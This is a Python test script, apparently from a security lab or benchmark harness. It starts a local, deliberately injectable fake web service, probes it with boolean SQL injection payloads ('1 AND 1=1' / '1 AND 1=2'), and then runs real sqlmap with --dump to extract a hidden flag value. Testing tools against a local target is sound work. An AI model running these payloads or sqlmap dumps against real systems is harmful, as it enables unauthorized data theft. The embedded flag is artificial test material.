"""
sahte_web.py'yi GERCEK sqlmap ile test eder.
"""

import subprocess
import sys
import time
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from servisler.sahte_web import SahteWebServisi  # noqa: E402

PORT = 8899
GIZLI_DEGER = "carotflag7391"


def main():
    servis = SahteWebServisi(GIZLI_DEGER, PORT)
    servis.baslat()
    time.sleep(0.4)

    try:
        print("--- servis elle doğrulanıyor ---")
        with urllib.request.urlopen(f"http://127.0.0.1:{PORT}/urun?id=1", timeout=5) as r:
            gecerli = r.read().decode()
        print("id=1:", gecerli[:60])
        assert "Klavye" in gecerli

        with urllib.request.urlopen(f"http://127.0.0.1:{PORT}/urun?id=9999", timeout=5) as r:
            gecersiz = r.read().decode()
        print("id=9999:", gecersiz[:60])
        assert "bulunamadi" in gecersiz

        with urllib.request.urlopen(f"http://127.0.0.1:{PORT}/urun?id=1%20AND%201=1", timeout=5) as r:
            true_yaniti = r.read().decode()
        with urllib.request.urlopen(f"http://127.0.0.1:{PORT}/urun?id=1%20AND%201=2", timeout=5) as r:
            false_yaniti = r.read().decode()
        print("boolean oracle çalışıyor mu:", true_yaniti != false_yaniti)
        assert true_yaniti != false_yaniti, "boolean-based blind için gerekli fark yok"
        print("✓ Servis doğru çalışıyor, boolean oracle net\n")

        print("--- GERÇEK sqlmap çalıştırılıyor (bu biraz sürebilir) ---")
        komut = [
            "sqlmap", "-u", f"http://127.0.0.1:{PORT}/urun?id=1",
            "--batch", "--level=1", "--risk=1", "--technique=B",
            "--threads=4",
            "--flush-session", "--dump", "-D", "main", "-T", "gizli", "-C", "deger",
        ]
        print("Komut:", " ".join(komut))
        sonuc = subprocess.run(komut, capture_output=True, text=True, timeout=180)

        print("\n--- sqlmap stdout (son 60 satır) ---")
        print("\n".join(sonuc.stdout.splitlines()[-60:]))

        bulundu = GIZLI_DEGER in sonuc.stdout
        print(f"\nGizli değer ({GIZLI_DEGER}) sqlmap çıktısında bulundu mu: {bulundu}")
        assert bulundu, "sqlmap gizli tabloyu çıkaramadı"
        print("\n✓ TEST GEÇTİ: sqlmap gerçekten enjeksiyonu buldu ve gizli tabloyu çıkardı")

    finally:
        servis.durdur()


if __name__ == "__main__":
    main()
